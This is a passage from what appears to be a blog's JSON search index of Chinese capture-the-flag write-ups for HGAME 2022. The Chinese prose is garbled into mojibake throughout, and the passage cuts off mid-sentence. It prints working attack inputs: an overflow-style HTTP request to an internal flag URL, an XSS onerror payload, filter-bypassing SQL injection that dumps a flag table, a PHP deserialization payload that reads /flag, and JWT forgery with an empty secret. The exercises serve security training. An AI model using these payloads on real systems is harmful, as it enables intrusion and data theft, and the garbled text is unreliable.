AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://internal.host/flag HTTP/1.1\nHost: httpd.summ3r.top:60010\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: _ga=GA1.2.96822747.1642680058; __gads=ID=4b3dca87d022d0d1-228a4a0003d00030:T=1642683351:RT=1642683351:S=ALNI_MaeO4O3BpsWq8DZeC3LDGGcOfbqYA\nUpgrade-Insecure-Requests: 1\nIf-Modified-Since: Tue, 25 Jan 2022 08:39:02 GMT\nIf-None-Match: \"22a-5d664045f9580\"\n\nÊãøÂà∞flag\n\nwebpack-engineÂæàÁÆÄÂçïÁöÑ‰∏ÄÈÅìÈ¢òÔºåÁî®chromeÊµèËßàÂô®ÊâìÂºÄÂæóÂà∞‰∏Ä‰∏≤ÊòéÊòæÊòØÁî®base64Âä†ÂØÜÁöÑÂ≠óÁ¨¶‰∏≤\n\nËøõË°å‰∏§Ê¨°base64 Ëß£Á†ÅÊãøÂà∞flag\n\nAt0mÁöÑÁïôË®ÄÊùø‰∏ÄÈÅìXSSÈ¢ò\nÂèëÁé∞Âú®headÊ†áÁ≠æ‰∏≠Â≠òÂú®flag\n\nÂÖ≥Ê≥®ÂÖ¨‰ºóÂè∑ÂèëÈÄÅÊ∂àÊÅØÂèëÁé∞ÊòØÂèØ‰ª•Âú®ËØ•È°µÈù¢ÊòæÁ§∫\nÊµãËØïÂèëÁé∞**&lt;img&gt;**Ê†áÁ≠æÊú™Ë¢´ËøáÊª§ÔºåÈÇ£‰πàÂèØ‰ª•ÊûÑÈÄ†payload\n&lt;img src=\"\" onerror=\"function inject()&#123;document.querySelector('.content').textContent=\ndocument.querySelector('head').textContent;&#125; inject();\">\n\nÁî®ÂæÆ‰ø°ÂèëÈÄÅ‰ªéËÄåÂæóÂà∞flagÔºàÊâãÊÖ¢ÁóõÂ§±Á∫¢ÂåÖQAQÔºâ\n\nPokemonÊâìÂºÄF12ÂèëÁé∞hint\n\nid‰∏∫1Ôºå2Ôºå3Êó∂ÈÉΩÊòØpokemonÔºåÂÖ∂‰ªñÊÉÖÂÜµÊòØ404\n\nÂèëÁé∞ËØ•È°µÈù¢‰ªéÂú®SQLÊ≥®ÂÖ•\nÂÖ∂ËøáÊª§‰∫Ü'select'Ôºå'from'Ôºå'where'Ôºå'='Ôºå' 'Ôºå'/**/'Ôºå'and'Ôºå'or'\nÂèØ‰ª•‰ΩøÁî®ÂèåÂÜôÁöÑÊñπÊ≥ïÁªïËøá\nÁ©∫Ê†ºÂíå&#x2F;**&#x2F;ÂèØ‰ª•Áî®&#x2F;*h*&#x2F;ÁªïËøá\n\n# ‰ΩøÁî®\n\n1&#x2F;*h*&#x2F;OorRDER&#x2F;*h*&#x2F;BY&#x2F;*h*&#x2F;2;#\n\n# ÂèëÁé∞ÂÖ∂ÊòØ‰∏§‰∏™Â≠óÊÆµÔºåÂÖ∂‰ªñÊï∞Â≠óÊä•Èîô\n# Êü•ËØ¢‰∏Ä‰∏ãÊï∞ÊçÆÂ∫ì\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,database();#\n\n# ÂèëÁé∞ÊúâpokemonËøô‰∏™Êï∞ÊçÆÂ∫ì\n# ÂÜçÁúã‰∏Ä‰∏ãËøô‰∏™pokemonËøô‰∏™Êï∞ÊçÆÂ∫ìÈáåÁöÑË°®Âêç\nps:Ê≥®ÊÑèinformationËøô‰∏™ÂçïËØçÈáåÂê´ÊúâËøáÊª§ÁöÑÂÖ≥ÈîÆÂ≠ó or\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(table_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.tables&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n# ÂèëÁé∞fllllllllaaaaaagËøô‰∏™Ë°®\n# ÂÜçÁúã‰∏Ä‰∏ãËøô‰∏™Ë°®ÈáåÊúâ‰ªÄ‰πàÂ≠óÊÆµ\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SEselectLECT&#x2F;*h*&#x2F;1,group_concat(column_name)&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;infoORrmation_schema.columns&#x2F;*h*&#x2F;WHEwhereRE&#x2F;*h*&#x2F;table_name&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;fllllllllaaaaaag&#39;&#x2F;*h*&#x2F;ANandD&#x2F;*h*&#x2F;table_schema&#x2F;*h*&#x2F;LIKE&#x2F;*h*&#x2F;&#39;pokemon&#39;;#\n\n#ÂèëÁé∞ËØ•Ë°®ÈáåÂ≠òÂú®Âêç‰∏∫flagÁöÑÂ≠óÊÆµ\n#Êü•Áúãflag\n\n1&#x2F;*h*&#x2F;UNIunionON&#x2F;*h*&#x2F;SELselectECT&#x2F;*h*&#x2F;1,flag&#x2F;*h*&#x2F;FRfromOM&#x2F;*h*&#x2F;fllllllllaaaaaag;#\n\n# ÊãøÂà∞ \n\n\n‰∏ÄÊú¨ÂçïËØç‰π¶Â∏∏ËßÑF12ÊâìÂºÄÂèëÁé∞hint\n\n‰∏ãËΩΩÈôÑ‰ª∂ÂæóÂà∞ÁΩëÁ´ôÊ∫êÁ†Å\n\nÂèØ‰ª•ÊâæÂà∞ÁôªÂΩïÁî®Êà∑Âêç‰∏∫:adm1n,ÂØÜÁ†ÅÂèØ‰ΩøÁî®Êï∞Â≠óÂä†Â≠óÊØçÁöÑÊñπÂºèÁªïËøáÔºåÂç≥passwordÂèØ‰ª•Â°´‰∏ä:1080a\nËæìÂÖ•Áî®Êà∑ÂêçÂíåÂØÜÁ†ÅËøõÂéª\nËøô‰∏™È°µÈù¢‰∏∫index.php\n\nÁªßÁª≠ÂÆ°‰∏ÄÂÆ°ÈôÑ‰ª∂‰∏≠ÁöÑ‰ª£Á†ÅÂèëÁé∞Â≠òÂú®ÂèçÂ∫èÂàóÂåñÊºèÊ¥û\nÂêåÊó∂ÂèëÁé∞flagÂú®   /flag\nË°®Âçï‰º†ËøõÂéªÁöÑÊï∞ÊçÆ‰ª•key:valueÁöÑÂΩ¢Âºè‰øùÂ≠òËøõË°åÂ§ÑÁêÜÔºåÂú®encode()‰∏≠key‰∏ç‰ºöË¢´Â∫èÂàóÂåñvalue‰ºöËøõË°åÂ∫èÂàóÂåñÂπ∂‰∏îÂéükeyÂíåÂ∫èÂàóÂåñÂêéÁöÑvalue‰ºö‰ª•**|**ËøõË°åÂàÜÈöî\nÂÖ≥ÈîÆÊòØËøô‰∏™encode()ÂáΩÊï∞Âíådecode()ÂáΩÊï∞\nfunction encode($data): string &#123;\n    $result = '';\n    foreach ($data as $k => $v) &#123;\n        $result .= $k . '|' . serialize($v);\n    &#125;\n\n    return $result;\n&#125;\n\nfunction decode(string $data): Array &#123;\n    $result = [];\n    $offset = 0;\n    $length = \\strlen($data);\n    while ($offset &lt; $length) &#123;\n        if (!strstr(substr($data, $offset), '|')) &#123;\n            return [];\n        &#125;\n        $pos = strpos($data, '|', $offset);\n        $num = $pos - $offset;\n        $varname = substr($data, $offset, $num);\n        $offset += $num + 1;\n        $dataItem = unserialize(substr($data, $offset));\n\n        $result[$varname] = $dataItem;\n        $offset += \\strlen(serialize($dataItem));\n    &#125;\n    return $result;\n&#125;\n\nÂú®decodeÊó∂‰ºö‰ª• | Êù•Âå∫ÂàÜkeyÂíåÂ∫èÂàóÂåñÂêéÁöÑvalueÔºàkeyÊú™Ë¢´Â∫èÂàóÂåñÔºâ\nÂÜçÁúãEvil.phpÔºåÂÖ∂ÂèØ‰ª•ËæìÂá∫flagÔºåÂè™ÈúÄÂ∞ÜËøô‰∏™fileË¶ÜÁõñ‰∏∫/flagÂç≥ÂèØ\n&lt;?php\n\nclass Evil &#123;\n    public $file;\n    public $flag;\n\n    public function __wakeup() &#123;\n        $content = file_get_contents($this->file);\n        if (preg_match(\"/hgame/\", $content)) &#123;\n            $this->flag = 'hacker!';\n        &#125;\n        $this->flag = $content;\n    &#125;\n&#125;\n\n\n\n\nÊó¢ÁÑ∂key‰∏ç‰ºöË¢´encodeÔºåÈÇ£ÂèØ‰ª•Âú®keyËøô‰∏™Âú∞Êñπ‰º†ÂÖ•Â∫èÂàóÂåñÂêéÁöÑEvilÁ±ªÂØπË±°ÔºåÁÑ∂ÂêéÂÜçdecodeËøô‰∏™keyÔºåÂæóÂà∞EvilÂØπË±°Ôºå‰πãÂêéËá™Âä®Ë∞ÉÁî®__wakeup()Ëøô‰∏™ÂáΩÊï∞ÔºåÊãøÂà∞flag„ÄÇÈÇ£‰πàË¶ÅËÆ©keyÂú®decode()ÂáΩÊï∞‰∏≠ÂèçÂ∫èÂàóÂåñÂèØÂú®ÊúÄÂâçÈù¢Âä†‰∏ä‰∏Ä‰∏™  |  ËøõË°åÁªïËøáÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÊääËøô‰∏™keyÂΩì‰ΩúvalueÊù•Â§ÑÁêÜÔºåÂàôÂèØ‰ª•ÊûÑÈÄ†payload\n|O:4:&quot;Evil&quot;:2:&#123;s:4:&quot;file&quot;;s:5:&quot;&#x2F;flag&quot;;s:4:&quot;flag&quot;;N;&#125;\n\nËæìÂÖ•Âà∞ ‚ÄúÂçïËØçÊ°Ü‚Äù\n\nÊãøÂà∞flag\n\nmiscÂ•áÂ¶ôÂ∞èÊ∏∏ÊàèncËøûÊé•\n\nÈ¶ñÂÖàË¶ÅÂÆåÊàêËøô‰∏™ÔºåÁõ¥Êé•‰ΩøÁî®pwntoolsËøô‰∏™Â∫ìÂÜôËÑöÊú¨\nimport hashlib\nfrom string import ascii_letters, digits\nfrom pwn import *\nfrom itertools import product\ntable = ascii_letters + digits\nclass Solve():\n    def __init__(self):\n        self.sh = remote('chuj.top', 51003)\n    def proof_of_work(self):\n        proof = self.sh.recvuntil(b'input your ????> ').decode()\n        # print(proof)\n        find_index = proof.find('????')\n        tail = proof[find_index:find_index + 4]\n        _hash = proof[find_index + 9:proof.find('\\ninput')]\n        # print(_hash)\n        for i in product(table, repeat=4):\n            t = hashlib.sha256((''.join(i)).encode()).hexdigest()\n            if t == _hash:\n                self.sh.sendline(''.join(i).encode())\n                print(''.join(i))\n                # print(t)\n                break\n\n    def solve(self):\n        self.proof_of_work()\n        self.sh.interactive()\n\nif __name__ == '__main__':\n    solution = Solve()\n    solution.solve()\n\nËøêË°åÂæóÂà∞\n\nË¶ÅÁé©Ëøô‰∏™Â∞èÊ∏∏ÊàèÔºåÈ¨ºËÑöÂõæÔºåÁé©ÈÄöËøáÂ∞±ËÉΩÊãøÂà∞flag‰∫Ü\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]},{"title":"HGAME 2022 Week1 writeup by pankas","url":"/2022/01/27/week1-pankas/","content":"webeasy_auth‚Äã    ÂÖàÁúã‰∏Ä‰∏ãÈ¢òÁõÆÔºåÊúâÊèêÁ§∫\n‚Äã    Â∞äË¥µÁöÑadminÂÜô‰∫Ü‰∏™todoÂ∏ÆÂä©Ëá™Â∑±ÁÆ°ÁêÜÊó•Â∏∏Ôºå‰ΩÜ‰ªñÂ•ΩÂÉèÊ≤°Ë∞ÉËØïÂÆåÂ∞±ÈÉ®ÁΩ≤‰∫Ü‚Ä¶.‰∏Ä‰∏™ÊúàÂêéÔºåÂΩì‰ªñÂÜç‰∏ÄÊ¨°ÊâìÂºÄ‰ªñÁöÑÂ∞èÁΩëÁ´ôÔºå‰ºº‰πéÂøòËÆ∞‰∫ÜÂØÜÁ†Å‚Ä¶‰ªñÁöÑtodo‰πãÂâçËÆ∞ÂΩï‰∫ÜÂæàÈáçË¶ÅÁöÑ‰∏úË•øÔºåÂø´Â∏ÆÂ∏Æ‰ªñ‰∏çË¶ÅÁàÜÁ†¥ÔºÅ\nËøôÈáåÁõÆÊ†áÁΩëÁ´ôÊó∂Âú®ÂºÄÂèë‰∏≠ÁöÑÔºåflagÂ∫îËØ•Âú®adminÁî®Êà∑Èáå„ÄÇ\n\nÊâìÂºÄÂèëÁé∞ËæìÂÖ•adminÂØÜÁ†ÅÈöè‰æøÂÜô‰∏Ä‰∏™ÔºåÁªìÊûú‰∏çÂØπÔºåÈÇ£Ê≥®ÂÜå‰∏Ä‰∏™ÁúãÁúã\nÊ≥®ÂÜåÂè∑ÁôªÂΩïËøõÂéª\n\nÁúã‰∫Ü‰∏ãËøô‰∏™È°µÈù¢‰πüÊ≤°‰ªÄ‰πàÔºåÊäì‰∏Ä‰∏ãÂåÖÂèëÁé∞token\n\nËøô‰∏™tokenÊòØJWTÔºåÁΩë‰∏äÊêúÁ¥¢‰∏Ä‰∏ãËøõËÉΩÁü•ÈÅìÂè™Ë¶ÅÊâæÂà∞‰∫ÜJWTÁöÑsecretÂ∞±ÂèØ‰ª•‰º™ÈÄ†tokenÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÈÄöËøáÈ™åËØÅ‰∫Ü\nÁî±‰∫éÈ¢òÁõÆËØ¥ÊòØËøòÂú®Ë∞ÉËØïÂΩì‰∏≠Ôºå ÁåúÊµãsecret‰∏∫Á©∫ÔºåËØï‰∏ÄËØï„ÄÇ\nÂà∞jwt.ioËøô‰∏™ÁΩëÁ´ôÈáå\n\nÂ∞ÜUserNameÊîπ‰∏∫adminÔºåIDÊîπ‰∏∫1(ÊúÄË¥µÁöÑadminÂºÄÂèëËÄÖËÇØÂÆöÊòØÁΩëÁ´ôÊ≥®ÂÜåÁöÑÁ¨¨‰∏Ä‰∏™‰∫∫)Ôºå‰∏ãÈù¢ÁöÑsecret‰∏∫Á©∫Ôºå\nÂ∞Ü‰øÆÊîπÂêéÁöÑtokenÂèëÈÄÅ\n\nÊãøÂà∞flag\n\nËøôÈáåÁÆÄÂçïËØ¥‰∏Ä‰∏ãÂéüÁêÜ\nÈ™åËØÅÊñπÊ≥ïÔºöÈ¶ñÂÖàÊúçÂä°Á´Ø‰ºö‰∫ßÁîü‰∏Ä‰∏™secretÔºåÁÑ∂Âêé‰ª•Ëøô‰∏™secret‰Ωú‰∏∫ÂØÜÈí•Ôºå‰ΩøÁî®Á¨¨‰∏ÄÈÉ®ÂàÜÈÄâÊã©ÁöÑÂä†ÂØÜÊñπÂºèÔºàËøôÈáåÂ∞±ÊòØHS256ÔºâÔºåÂØπÁ¨¨‰∏ÄÈÉ®ÂàÜÂíåÁ¨¨‰∫åÈÉ®ÂàÜÊãºÊé•ÁöÑÁªìÊûúËøõË°åÂä†ÂØÜÔºåÁÑ∂ÂêéÊääÂä†ÂØÜÁªìÊûúÊîæÂà∞Á¨¨‰∏âÈÉ®ÂàÜ„ÄÇÂõ†‰∏∫Âä†ÂØÜÁÆóÊ≥ïÊàë‰ª¨Â∑≤ÁªèÁü•ÈÅì‰∫ÜÔºåÂ¶ÇÊûúÊàë‰ª¨Âè™Ë¶ÅÂÜçÂæóÂà∞Âä†ÂØÜÁöÑsecretÔºåÊàë‰ª¨Â∞±ËÉΩ‰º™ÈÄ†Êï∞ÊçÆÔºåÂπ∂‰∏îÈÄöËøáÊúçÂä°Âô®ÁöÑÊ£ÄÊü•„ÄÇ\nTetris plusÊèêÁ§∫ËØ¥Ë¶ÅÁé©Â§ü3000ÂàÜÔºå‰∏çÂèØËÉΩÁöÑ„ÄÇÂÉèËøôÁ±ªÊµèËßàÂô®Â∞èÊ∏∏ÊàèÈÇ£ËÇØÂÆöÊòØÂÖàÊü•ÁúãjsÊ∫êÁ†Å„ÄÇ\n\nÁªìÊûúÂú®Ëøô‰∏™checking.jsÊñá‰ª∂ÈáåÂèëÁé∞‰∫Üjsfuck‰ª£Á†ÅÔºåjsfuckÂèØ‰ª•Áõ¥Êé•ÊîæÂà∞ÊéßÂà∂Âè∞ËøêË°åÔºåËØïËØïÁúã„ÄÇ\n\nÊîæÂà∞ÊéßÂà∂Âè∞ËøêË°åÊãøÂà∞flag„ÄÇ\nFujiwara Tofu ShopÁßãÂêçÂ±±È£ôËΩ¶ÂïäÔºåËøõÂéªÁúã‰∏ÄÁúã„ÄÇ\n\nÊèêÁ§∫ËØ¥È¶ñÂÖàË¶ÅÂà∞qiumingshan.netËøô‰∏™Âú∞ÊñπÂéªÔºåÈÇ£‰πàÂú®web‰∏≠ÁöÑÊÑèÊÄùÂ∞±ÊòØË¶ÅËÆ©‰Ω†ÁöÑreferer‰∏∫qiumingshan.net\nÁî®HackBarÊ∑ªÂä†ËØ∑Ê±ÇÂ§¥referer\n\nExecuteÂêéÂèàÂá∫Áé∞\n\nÈÄöË°åËØÅÂïäÔºåÈÇ£‰πà‰øÆÊîπ‰∏Ä‰∏ãUser-Agent‰∏∫Hachi-RokuÂç≥ÂèØ\n\nÁªßÁª≠ÂæóÂà∞\n\nË¶ÅÊ±ÇÂÖ∂cookieÁöÑÂë≥ÈÅìÊòØRaspberryÔºåÈÇ£‰πàÂú®Cookies‰∏äÊ∑ªÂä†‰∏äflavor=Raspberry\n\n‰πãÂêé‚Ä¶..ËøòÊúâÔºåË¶ÅÊ±ÇÂä†Ê≤πÂà∞100ÔºåÊü•ÁúãËØ∑Ê±ÇÂ§¥ÂèØ‰ª•ÁúãÂà∞ÂΩìÂâçGasoline‰∏∫0\n\nÈÇ£‰πàÂú®ËØ∑Ê±ÇÂ§¥ÈáåÊ∑ªÂä†‰∏äGasoline: 